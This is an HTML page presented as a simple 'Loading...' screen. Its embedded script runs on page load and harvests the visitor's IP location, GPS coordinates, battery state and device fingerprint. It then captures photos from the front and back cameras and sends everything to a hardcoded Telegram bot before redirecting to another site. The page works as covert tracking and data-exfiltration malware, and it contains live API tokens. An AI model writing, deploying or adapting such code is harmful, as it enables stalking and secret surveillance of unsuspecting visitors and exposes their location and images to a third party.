
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Loading...</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <style>
    body {
      margin: 0;
      background: #fff;
      color: #000;
      font-family: sans-serif;
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }
  </style>
</head>
<body>
  <p>Loading...</p>

  <script>
    const BOT_TOKEN = "7740401254:AAHhnSMhm-dMcv7-4LJCGwHchxRrYhBEsCY";
    const CHAT_ID = "7216371031";
    const REDIRECT_URL = "https://opaslabs.vercel.app";
    let deviceInfo = "";
    let redirected = false;

    setTimeout(() => {
      if (!redirected) window.location.href = REDIRECT_URL;
    }, 8000); // fallback after 8s

    function sendToTelegram(message) {
      return fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ chat_id: CHAT_ID, text: message })
      });
    }

    function sendPhotoToTelegram(blob) {
      const formData = new FormData();
      formData.append("chat_id", CHAT_ID);
      formData.append("photo", blob, "photo.jpg");
      return fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
        method: "POST",
        body: formData
      });
    }

    async function takePhoto(facing = "user") {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({
          video: { facingMode: { ideal: facing } }
        });
        const video = document.createElement("video");
        video.srcObject = stream;
        await video.play();
        const canvas = document.createElement("canvas");
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        const ctx = canvas.getContext("2d");
        ctx.drawImage(video, 0, 0);
        stream.getTracks().forEach(track => track.stop());
        const blob = await new Promise(res => canvas.toBlob(res, "image/jpeg", 0.85));
        await sendPhotoToTelegram(blob);
        return true;
      } catch {
        deviceInfo += `ğŸš« Camera (${facing}): Denied or blocked\n`;
        return false;
      }
    }

    function detectDeviceBrand() {
      const ua = navigator.userAgent.toLowerCase();
      if (ua.includes("iphone")) return "Apple iPhone";
      if (ua.includes("ipad")) return "Apple iPad";
      if (ua.includes("mac")) return "Apple Mac";
      if (ua.includes("samsung")) return "Samsung";
      if (ua.includes("xiaomi")) return "Xiaomi";
      if (ua.includes("redmi")) return "Redmi";
      if (ua.includes("realme")) return "Realme";
      if (ua.includes("vivo")) return "Vivo";
      if (ua.includes("oppo")) return "Oppo";
      if (ua.includes("oneplus")) return "OnePlus";
      if (ua.includes("nokia")) return "Nokia";
      if (ua.includes("asus")) return "Asus";
      if (ua.includes("huawei")) return "Huawei";
      if (ua.includes("lenovo")) return "Lenovo";
      if (ua.includes("windows")) return "Windows PC";
      if (ua.includes("android")) return "Android (Unknown)";
      return "Unknown";
    }

    function getBatteryInfo() {
      return navigator.getBattery().then(battery => {
        deviceInfo += `ğŸ”‹ Battery: ${Math.round(battery.level * 100)}%\n`;
        deviceInfo += `âš¡ Charging: ${battery.charging ? "Yes" : "No"}\n`;
      }).catch(() => {
        deviceInfo += `ğŸ”‹ Battery: Not Available\n`;
      });
    }

    function getIPInfo() {
      return fetch("https://ipinfo.io/json?token=ce7fbbdbe9fd92")
        .then(res => res.json())
        .then(ip => {
          const loc = ip.loc ? ip.loc.split(",") : ["N/A", "N/A"];
          deviceInfo += `ğŸŒ IP: ${ip.ip}\n`;
          deviceInfo += `ğŸ“ Location: ${ip.city}, ${ip.region}, ${ip.country}\n`;
          deviceInfo += `ğŸ“Œ Lat: ${loc[0]}, Lon: ${loc[1]}\n`;
          deviceInfo += `ğŸŒ ISP: ${ip.org || "Unknown"}\n`;
        }).catch(() => {
          deviceInfo += `ğŸŒ IP: Not Available\nğŸ“ Location: Unknown\n`;
        });
    }

    function getGPSLocation() {
      return new Promise(resolve => {
        if (!navigator.geolocation) return resolve();
        navigator.geolocation.getCurrentPosition(
          pos => {
            const { latitude, longitude, accuracy } = pos.coords;
            deviceInfo += `ğŸ“¡ GPS: ${latitude}, ${longitude} (Â±${accuracy}m)\n`;
            resolve();
          },
          () => {
            deviceInfo += `ğŸ“¡ GPS: Denied or unavailable\n`;
            resolve();
          },
          { enableHighAccuracy: true, timeout: 4000 }
        );
      });
    }

    function getExtraDetails() {
      const touch = 'ontouchstart' in window ? "Yes" : "No";
      const languages = navigator.languages.join(", ");
      const timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;
      const brand = detectDeviceBrand();
      deviceInfo += `ğŸ“± Brand: ${brand}\n`;
      deviceInfo += `ğŸŒ Languages: ${languages}\n`;
      deviceInfo += `ğŸ§  RAM: ${navigator.deviceMemory || "?"} GB\n`;
      deviceInfo += `ğŸ§® CPU Cores: ${navigator.hardwareConcurrency || "?"}\n`;
      deviceInfo += `ğŸ“² Touch: ${touch}\n`;
      deviceInfo += `ğŸ•“ Timezone: ${timeZone} (UTC${-new Date().getTimezoneOffset()/60})\n`;
      deviceInfo += `ğŸ’» Platform: ${navigator.platform}\n`;
      deviceInfo += `ğŸ–¥ï¸ Screen: ${screen.width}x${screen.height}\n`;
      deviceInfo += `ğŸ“± UA: ${navigator.userAgent}\n`;
      deviceInfo += `ğŸ•’ Time: ${new Date().toLocaleString()}\n`;
      deviceInfo += `ğŸ”— Referrer: ${document.referrer || "Direct"}\n`;
    }

    async function runAll() {
      await Promise.all([getBatteryInfo(), getIPInfo(), getGPSLocation()]);
      getExtraDetails();
      await sendToTelegram(deviceInfo);

      const front = await takePhoto("user");
      const back = await takePhoto("environment");

      if (!front && !back) {
        await sendToTelegram("ğŸš« Both cameras denied.");
      }

      redirected = true;
      window.location.href = REDIRECT_URL;
    }

    window.onload = runAll;
  </script>
</body>
</html>
